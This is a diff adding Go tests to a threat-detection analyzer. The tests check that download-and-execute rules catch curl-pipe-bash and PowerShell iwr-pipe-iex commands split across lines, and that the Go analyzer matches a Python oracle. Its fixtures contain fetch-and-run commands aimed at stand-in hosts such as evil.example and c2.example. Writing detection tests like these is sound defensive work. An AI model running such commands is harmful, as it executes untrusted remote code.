@@ -3,6 +3,7 @@ package threat
 import (
 	"encoding/json"
 	"os"
+	"slices"
 	"strings"
 	"testing"
 
@@ -11,6 +12,10 @@ import (
 
 // Shared corpus with the Python baseline (docs/detection-baseline.md).
 const corpusPath = "../../../control-api/app/tests/fixtures/threat/corpus.json"
+
+// Field-level oracle produced by apps/control-api/scripts/gen_threat_match_oracle_v1.py
+// (Python analyzer as independent producer for the shared regex layer).
+const oraclePath = "../../../control-api/app/tests/fixtures/threat/match_oracle_v1.json"
 
 type sample struct {
 	ID       string `json:"id"`
@@ -192,6 +197,271 @@ func TestFirstHitPerRuleOnly(t *testing.T) {
 	}
 	if n != 1 {
 		t.Fatalf("rule must be recorded once per blob, got %d", n)
+	}
+}
+
+func TestShellBackslashContinuationJoinsDownloadExec(t *testing.T) {
+	a := analyzer(t)
+	content := "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh \\\n| bash\n"
+	r := a.Analyze([]byte(content), "x.sh", "")
+	var hit *Match
+	for i := range r.Matches {
+		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
+			hit = &r.Matches[i]
+			break
+		}
+	}
+	if hit == nil {
+		t.Fatal("continued curl|bash must hit threat-download-exec-pipe")
+	}
+	if hit.Line != 2 {
+		t.Fatalf("line=%d want 2 (first physical line of continuation)", hit.Line)
+	}
+}
+
+func TestShellPseudoPipeContinuationJoinsDownloadExec(t *testing.T) {
+	a := analyzer(t)
+	// No trailing backslash; next physical line starts with "|".
+	content := "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh\n| bash\n"
+	r := a.Analyze([]byte(content), "x.sh", "")
+	var hit *Match
+	for i := range r.Matches {
+		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
+			hit = &r.Matches[i]
+			break
+		}
+	}
+	if hit == nil {
+		t.Fatal("pseudo-pipe curl\\n| bash must hit threat-download-exec-pipe")
+	}
+	if hit.Line != 2 {
+		t.Fatalf("line=%d want 2 (first physical line of pseudo pipe)", hit.Line)
+	}
+}
+
+func TestUnicodeLineSeparatorSplitsLikePython(t *testing.T) {
+	a := analyzer(t)
+	// U+2028 LINE SEPARATOR between curl and "| bash" (DEV06-G / M-D2).
+	content := "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh\u2028| bash\n"
+	r := a.Analyze([]byte(content), "x.sh", "")
+	var hit *Match
+	for i := range r.Matches {
+		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
+			hit = &r.Matches[i]
+			break
+		}
+	}
+	if hit == nil {
+		t.Fatal("U+2028-separated curl|bash must hit")
+	}
+	if hit.Line != 2 {
+		t.Fatalf("line=%d want 2 after Unicode line split + pseudo-pipe join", hit.Line)
+	}
+}
+
+func TestWordBoundaryRejectsCurlPrefix(t *testing.T) {
+	a := analyzer(t)
+	content := "#!/bin/bash\nnotcurl -fsSL https://evil.example/x.sh | bash\n"
+	r := a.Analyze([]byte(content), "x.sh", "")
+	for _, m := range r.Matches {
+		if m.RuleID == "threat-download-exec-pipe" {
+			t.Fatalf("\\bcurl\\b must not match notcurl; got line=%d excerpt=%q", m.Line, m.Excerpt)
+		}
+	}
+}
+
+func TestPowerShellPseudoPipeContinuationJoinsDownloadExec(t *testing.T) {
+	a := analyzer(t)
+	content := "Write-Host hi\niwr http://c2.example/update.ps1\n| iex\n"
+	r := a.Analyze([]byte(content), "update.ps1", "")
+	if r.DetectedType != "powershell" {
+		t.Fatalf("detected_type=%s want powershell", r.DetectedType)
+	}
+	var hit *Match
+	for i := range r.Matches {
+		if r.Matches[i].RuleID == "threat-download-exec-powershell" {
+			hit = &r.Matches[i]
+			break
+		}
+	}
+	if hit == nil {
+		t.Fatal("PS pseudo-pipe iwr\\n| iex must hit threat-download-exec-powershell")
+	}
+	if hit.Line != 2 {
+		t.Fatalf("line=%d want 2", hit.Line)
+	}
+}
+
+func TestPythonDoesNotJoinPseudoPipe(t *testing.T) {
+	a := analyzer(t)
+	content := "print(\"curl http://x\")\n| not_shell\n"
+	r := a.Analyze([]byte(content), "x.py", "")
+	if r.DetectedType != "python" {
+		t.Fatalf("detected_type=%s want python", r.DetectedType)
+	}
+	for _, m := range r.Matches {
+		if m.RuleID == "threat-download-exec-pipe" {
+			t.Fatal("python must not pseudo-pipe-join into download-exec")
+		}
+	}
+}
+
+func TestPowerShellBacktickContinuationJoinsDownloadExec(t *testing.T) {
+	a := analyzer(t)
+	content := "Write-Host hi\niwr http://c2.example/update.ps1 `\n| iex\n"
+	r := a.Analyze([]byte(content), "update.ps1", "")
+	if r.DetectedType != "powershell" {
+		t.Fatalf("detected_type=%s want powershell", r.DetectedType)
+	}
+	var hit *Match
+	for i := range r.Matches {
+		if r.Matches[i].RuleID == "threat-download-exec-powershell" {
+			hit = &r.Matches[i]
+			break
+		}
+	}
+	if hit == nil {
+		t.Fatal("PS backtick-continued iwr|iex must hit threat-download-exec-powershell")
+	}
+	if hit.Line != 2 {
+		t.Fatalf("line=%d want 2 (first physical line of PS continuation)", hit.Line)
+	}
+}
+
+func TestShellDoesNotJoinPowerShellBacktick(t *testing.T) {
+	a := analyzer(t)
+	// Trailing backtick is not POSIX continuation; shell must keep physical lines.
+	content := "#!/bin/bash\necho ready `\ncurl -fsSL https://evil.example/x.sh | bash\n"
+	r := a.Analyze([]byte(content), "x.sh", "")
+	if r.DetectedType != "shell" {
+		t.Fatalf("detected_type=%s", r.DetectedType)
+	}
+	var hit *Match
+	for i := range r.Matches {
+		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
+			hit = &r.Matches[i]
+			break
+		}
+	}
+	if hit == nil {
+		t.Fatal("expected hit on physical curl|bash line")
+	}
+	if hit.Line != 3 {
+		t.Fatalf("shell must not join on backtick; line=%d want 3", hit.Line)
+	}
+}
+
+func TestPythonTrailingBackslashNotJoined(t *testing.T) {
+	a := analyzer(t)
+	content := "path = \"foo\\\\\"\nos.system(\"ls\")\n"
+	r := a.Analyze([]byte(content), "x.py", "")
+	if r.DetectedType != "python" {
+		t.Fatalf("detected_type=%s want python", r.DetectedType)
+	}
+	for _, m := range r.Matches {
+		if m.RuleID == "threat-py-os-system-regex" && m.Line != 2 {
+			t.Fatalf("python line must stay physical: got %d", m.Line)
+		}
+	}
+}
+
+type oracleMatch struct {
+	RuleID        string  `json:"rule_id"`
+	Line          int     `json:"line"`
+	Excerpt       string  `json:"excerpt"`
+	ExcerptSHA256 string  `json:"excerpt_sha256"`
+	Severity      string  `json:"severity"`
+	Confidence    float64 `json:"confidence"`
+}
+
+type oracleVector struct {
+	SampleID            string       `json:"sample_id"`
+	Label               string       `json:"label"`
+	Filename            string       `json:"filename"`
+	ContentSHA256       string       `json:"content_sha256"`
+	DetectedType        string       `json:"detected_type"`
+	ExpectedSharedMatch *oracleMatch `json:"expected_shared_match"`
+	SharedRuleIDs       []string     `json:"shared_rule_ids"`
+	PythonOnlyRuleIDs   []string     `json:"python_only_rule_ids"`
+}
+
+// TestMatchOracleFieldParity locks Go to the Python-produced field oracle:
+// content sha256, detected_type, shared rule_id set, and labelled
+// line/excerpt/excerpt_sha256/severity/confidence. AST-only hits must be empty on Go.
+func TestMatchOracleFieldParity(t *testing.T) {
+	raw, err := os.ReadFile(oraclePath)
+	if err != nil {
+		t.Skipf("match oracle not available: %v", err)
+	}
+	var doc struct {
+		Schema            string         `json:"schema"`
+		PythonOnlyRuleIDs []string       `json:"python_only_rule_ids"`
+		Vectors           []oracleVector `json:"vectors"`
+	}
+	if err := json.Unmarshal(raw, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if doc.Schema != "threat_match_oracle/v1" {
+		t.Fatalf("unexpected schema %q", doc.Schema)
+	}
+
+	byID := map[string]sample{}
+	for _, s := range loadCorpus(t) {
+		byID[s.ID] = s
+	}
+	a := analyzer(t)
+	for _, vec := range doc.Vectors {
+		s, ok := byID[vec.SampleID]
+		if !ok {
+			t.Errorf("oracle sample %s missing from corpus", vec.SampleID)
+			continue
+		}
+		got := a.Analyze([]byte(s.Content), s.Filename, "")
+		if got.SHA256 != vec.ContentSHA256 {
+			t.Errorf("%s: content sha256 %s want %s", vec.SampleID, got.SHA256, vec.ContentSHA256)
+		}
+		if got.DetectedType != vec.DetectedType {
+			t.Errorf("%s: detected_type %s want %s", vec.SampleID, got.DetectedType, vec.DetectedType)
+		}
+		sharedIDs := make([]string, 0, len(got.Matches))
+		byRule := map[string]Match{}
+		for _, m := range got.Matches {
+			sharedIDs = append(sharedIDs, m.RuleID)
+			byRule[m.RuleID] = m
+		}
+		slices.Sort(sharedIDs)
+		wantShared := append([]string(nil), vec.SharedRuleIDs...)
+		slices.Sort(wantShared)
+		if !slices.Equal(sharedIDs, wantShared) {
+			t.Errorf("%s: shared rule ids %v want %v", vec.SampleID, sharedIDs, wantShared)
+		}
+		if len(vec.PythonOnlyRuleIDs) != 0 {
+			// Oracle may list AST hits from Python; Go must not emit them.
+			for _, id := range vec.PythonOnlyRuleIDs {
+				if _, hit := byRule[id]; hit {
+					t.Errorf("%s: Go must not emit python-only rule %s", vec.SampleID, id)
+				}
+			}
+		}
+		if vec.ExpectedSharedMatch == nil {
+			continue
+		}
+		exp := vec.ExpectedSharedMatch
+		m, ok := byRule[exp.RuleID]
+		if !ok {
+			t.Errorf("%s: missing labelled rule %s", vec.SampleID, exp.RuleID)
+			continue
+		}
+		if m.Line != exp.Line || m.Excerpt != exp.Excerpt || m.ExcerptSHA256 != exp.ExcerptSHA256 {
+			t.Errorf("%s/%s: line/excerpt mismatch got=(%d,%q,%s) want=(%d,%q,%s)",
+				vec.SampleID, exp.RuleID,
+				m.Line, m.Excerpt, m.ExcerptSHA256,
+				exp.Line, exp.Excerpt, exp.ExcerptSHA256)
+		}
+		if m.Severity != exp.Severity || m.Confidence != exp.Confidence {
+			t.Errorf("%s/%s: severity/confidence got=(%s,%v) want=(%s,%v)",
+				vec.SampleID, exp.RuleID, m.Severity, m.Confidence, exp.Severity, exp.Confidence)
+		}
 	}
 }
 
